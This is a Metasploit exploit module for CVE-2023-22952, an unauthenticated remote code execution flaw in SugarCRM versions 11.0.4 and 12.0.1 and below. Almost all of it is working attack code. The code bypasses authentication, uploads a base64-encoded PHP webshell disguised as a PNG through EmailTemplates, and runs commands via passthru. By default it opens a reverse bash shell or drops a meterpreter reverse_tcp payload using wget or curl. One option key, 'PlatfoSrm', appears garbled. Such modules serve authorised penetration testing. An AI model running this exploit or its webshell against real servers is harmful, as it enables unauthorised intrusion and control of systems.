##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'securerandom'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
  include Msf::Exploit::FileDropper

  prepend Msf::Exploit::Remote::AutoCheck

  # Base64 PNG webshell code. Credits to sw33t.0day
  # <?php echo "#####"; passthru(base64_decode($_POST["c"])); echo "#####"; ?>
  PNG_B64_WEBSHELL = 'iVBORw0KGgoAAAANSUhEUgAAABkAAAAUCAMAAABPqWaPAAAAS1BMVEU8P3BocCBlY2hvICIjIyMjIyI7IHBhc3N0aHJ1KGJhc2U2NF9kZWNvZGUoJF9QT1NUWyJjIl0pKTsgZWNobyAiIyMjIyMiOyA/PiD2GHg3AAAACXBIWXMAAA7EAAAOxAGVKw4bAAAAKklEQVQokWNgwA0YmZhZWNnYOTi5uHl4+fgFBIWERUTFxCXwaBkFQxQAADC+AS1MHloSAAAAAElFTkSuQmCC'.freeze

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'SugarCRM unauthenticated Remote Code Execution (RCE)',
        'Description' => %q{
          This module exploits a Remote Code Execution vulnerability that has been identified in the SugarCRM application.
          Using a specially crafted request, custom PHP code can be uploaded and injected through the EmailTemplates because of missing input validation.
          Any user privileges can exploit this vulnerability and it results in access to the underlying operating system with the same privileges
          under which the web services run (typically user www-data). 
          SugarCRM 11.0 Professional, Enterprise, Ultimate, Sell and Serve versions 11.0.4 and below are affected. Fixed in release 11.0.5 
          SugarCRM 12.0 Enterprise, Sell and Serve versions 12.0.1 and below are affected. Fixed in release 12.0.2.
        },
        'Author' => [
          'Sw33t.0day', # discovery
          'h00die-gr3y <h00die.gr3y[at]gmail.com>' # Metasploit module
        ],
        'References' => [
          [ 'CVE', '2023-22952' ],
          [ 'URL', 'https://seclists.org/fulldisclosure/2022/Dec/31' ],
          [ 'URL', 'https://support.sugarcrm.com/Resources/Security/sugarcrm-sa-2023-001/' ],
          [ 'URL', 'https://attackerkb.com/topics/E486ui94II/cve-2023-22952' ],
          [ 'PACKETSTORM', '170346' ]
        ],
        'License' => MSF_LICENSE,
        'PlatfoSrm' => 'unix',
        'Privileged' => false,
        'Arch' => [ ARCH_CMD ],
        'Targets' => [
          [
            'Unix Command',
            {
              'Platform' => 'unix',
              'Arch' => ARCH_CMD,
              'Type' => :unix_cmd,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/unix/reverse_bash'
              }
            }
          ],
          [
            'Linux Dropper',
            {
              'Platform' => 'linux',
              'Arch' => [ ARCH_X64 ],
              'Type' => :linux_dropper,
              'CmdStagerFlavor' => [ 'wget', 'curl' ],
              'DefaultOptions' => {
                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'
              }
            }
          ]
        ],
        'DefaultTarget' => 0,
        'DisclosureDate' => '2022-12-28',
        'DefaultOptions' => {
          'SSL' => true,
          'RPORT' => 443
        },
        'Notes' => {
          'Stability' => [ CRASH_SAFE ],
          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ],
          'Reliability' => [ REPEATABLE_SESSION ]
        }
      )
    )
    register_options(
      [
        OptString.new('WEBSHELL', [
          false, 'The name of the webshell with extension to trick the parser like .phtml, .phar, .shtml, .inc, etc... Webshell name will be randomly generated if left unset.', nil
        ])
      ]
    )
  end

  def authenticate
    # generate PHP session-id
    @phpsessid = "PHPSESSID=#{SecureRandom.uuid}"

    # randomize user and password to obfuscate and make finger printing difficult.
    user_name = Rex::Text.rand_name
    user_password = Rex::Text.rand_text_alphanumeric(8..16)

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'index.php'),
      'cookie' => @phpsessid.to_s,
      'ctype' => 'application/x-www-form-urlencoded',
      'vars_post' => {
        'module' => 'Users',
        'action' => 'Authenticate',
        'user_name' => user_name.to_s,
        'user_password' => user_password.to_s
      }
    })
    if res && res.code == 500 && !res.body.blank?
      return true
    else
      return false
    end
  rescue StandardError => e
    elog("#{peer} - Communication error occurred: #{e.message}", error: e)
    return nil
  end

  def upload_webshell
    # randomize file name and extension if option WEBSHELL is not set
    file_ext = ['phar', 'phtml']
    if datastore['WEBSHELL'].blank?
      @webshell_name = "#{Rex::Text.rand_text_alpha(8..16)}.#{file_ext[rand(2)]}"
    else
      @webshell_name = datastore['WEBSHELL'].to_s
    end

    png_webshell = Base64.strict_decode64(PNG_B64_WEBSHELL)

    # construct multipart form data based on Chrome browser fingerprint
    boundary = "----WebKitFormBoundary#{rand_text_alphanumeric(16)}"
    form_data = "--#{boundary}\r\n"
    form_data << "Content-Disposition: form-data; name=\"action\"\r\n"
    form_data << "\r\n"
    form_data << "AttachFiles\r\n"
    form_data << "--#{boundary}\r\n"
    form_data << "Content-Disposition: form-data; name=\"module\"\r\n"
    form_data << "\r\n"
    form_data << "EmailTemplates\r\n"
    form_data << "--#{boundary}\r\n"
    form_data << "Content-Disposition: form-data; name=\"file\"; filename=\"#{@webshell_name}\"\r\n"
    form_data << "Content-Type: image/png\r\n"
    form_data << "\r\n"
    form_data << png_webshell.to_s
    form_data << "\r\n"
    form_data << "--#{boundary}--\r\n"

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'index.php'),
      'cookie' => @phpsessid.to_s,
      'ctype' => "multipart/form-data; boundary=#{boundary}",
      'data' => form_data
    })
    if res && res.code == 200 && !res.body.blank? && res.body =~ /#{@webshell_name}/
      return true
    else
      return false
    end
  rescue StandardError => e
    elog("#{peer} - Communication error occurred: #{e.message}", error: e)
    return nil
  end

  def check_vuln(cmd)
    payload = Base64.strict_encode64(cmd)
    return send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'cache', 'images', @webshell_name),
      'cookie' => @phpsessid.to_s,
      'ctype' => 'application/x-www-form-urlencoded',
      'vars_post' => {
        'c' => payload
      }
    })
  rescue StandardError => e
    elog("#{peer} - Communication error occurred: #{e.message}", error: e)
    return nil
  end

  def execute_command(cmd, _opts = {})
    payload = Base64.strict_encode64(cmd)
    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'cache', 'images', @webshell_name),
      'cookie' => @phpsessid.to_s,
      'ctype' => 'application/x-www-form-urlencoded',
      'vars_post' => {
        'c' => payload
      }
    })
  rescue StandardError => e
    elog("#{peer} - Communication error occurred: #{e.message}", error: e)
    fail_with(Failure::Unknown, "Communication error occurred: #{e.message}")
  end

  def check
    print_status('Sending authentication request.')
    return CheckCode::Unknown('Authentication bypass failed.') unless authenticate

    print_status('Uploading webshell and retrieving SugarCRM version.')
    return CheckCode::Safe("Webshell #{@webshell_name} upload failed, the system is likely patched.") unless upload_webshell

    # Set marker to find webshell command response, get the SugarCRM version and remove the webshell
    marker = '#####'
    res = check_vuln("cat ../../sugar_version.json;rm #{@webshell_name}")
    return CheckCode::Safe("Webshell #{@webshell_name} not found, the system is likely patched.") unless res && (res.code == 403) || (res.code == 200 && !res.body.blank? && res.body =~ /#{marker}/)
    return CheckCode::Vulnerable("Webshell #{@webshell_name} upload successful but execution failed. Try other extensions to beat the parser.") if res.code == 403 || res.body =~ /passthru/

    # Process json response.
    sugar_version_json = res.body[/#{marker}(.*?)#{marker}/m, 1]
    return CheckCode::Vulnerable('Version information not available.') if sugar_version_json.blank?

    return CheckCode::Vulnerable(sugar_version_json.to_s)
  end

  def exploit
    fail_with(Failure::NoAccess, 'Authentication bypass failed.') unless authenticate
    fail_with(Failure::NotVulnerable, "Webshell #{@webshell_name} upload failed, the system is likely patched.") unless upload_webshell
    register_file_for_cleanup(@webshell_name.to_s)

    print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")
    case target['Type']
    when :unix_cmd
      execute_command(payload.encoded)
    when :linux_dropper
      execute_cmdstager
    end
  end
end
